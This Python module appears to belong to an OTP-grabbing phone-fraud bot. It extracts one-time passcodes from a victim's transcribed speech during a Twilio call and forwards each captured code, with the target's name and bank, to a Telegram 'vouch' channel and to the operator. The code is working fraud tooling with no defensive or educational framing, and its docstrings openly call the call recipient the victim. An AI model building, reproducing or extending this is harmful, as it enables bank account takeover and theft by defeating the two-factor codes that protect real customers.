"""
OTP extraction from speech and channel notification.
"""

import re
import logging
from datetime import datetime

logger = logging.getLogger(__name__)


def extract_otp(text: str, code_length: int = None) -> str:
    """
    Extract a numeric code from transcribed text.
    
    IMPORTANT: Code length is USER-PROVIDED, not hardcoded.
    If code_length is specified, match exactly that many consecutive digits.
    Otherwise, match any continuous digit sequence.
    
    Args:
        text: Transcribed user speech
        code_length: Expected code length (e.g., 4, 6, 8) or None for any
        
    Returns:
        Extracted code string or None
    """
    if not text:
        return None
    
    # Match continuous digit sequences
    matches = re.findall(r'\d+', text)
    
    if not matches:
        return None
    
    # If code_length specified, look for exact match
    if code_length:
        for match in matches:
            if len(match) == code_length:
                return match
        # If no exact match, return first match as fallback
        return matches[0] if matches else None
    
    # Return longest match (usually the code)
    return max(matches, key=len) if matches else None


def send_otp_to_channel(
    otp: str,
    call_sid: str,
    target_name: str,
    company: str,
    bot,
    chat_id: int = None
):
    """
    Send OTP to both channel and user's chat.
    
    Args:
        otp: The captured OTP/code
        call_sid: Twilio call SID
        target_name: Victim's name
        company: Bank/company name
        bot: Telebot instance
        chat_id: User's chat ID (for direct message)
    """
    from config import VOUCH_CHANNEL_ID
    
    message = (
        f"🔑 *OTP Captured*\n"
        f"📞 Call SID: `{call_sid}`\n"
        f"👤 Target: {target_name}\n"
        f"🏢 Company: {company}\n"
        f"🔢 Code: `{otp}`\n"
        f"🕐 Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
    )
    
    try:
        # Send to channel
        bot.send_message(
            chat_id=int(VOUCH_CHANNEL_ID),
            text=message,
            parse_mode="Markdown"
        )
        logger.info(f"OTP {otp} sent to channel {VOUCH_CHANNEL_ID}")
    except Exception as e:
        logger.error(f"Failed to send to channel: {e}")
    
    # Send to user if chat_id provided
    if chat_id:
        try:
            user_message = f"✅ OTP captured: `{otp}`"
            bot.send_message(
                chat_id=chat_id,
                text=user_message,
                parse_mode="Markdown"
            )
            logger.info(f"OTP {otp} sent to user {chat_id}")
        except Exception as e:
            logger.error(f"Failed to send to user: {e}")
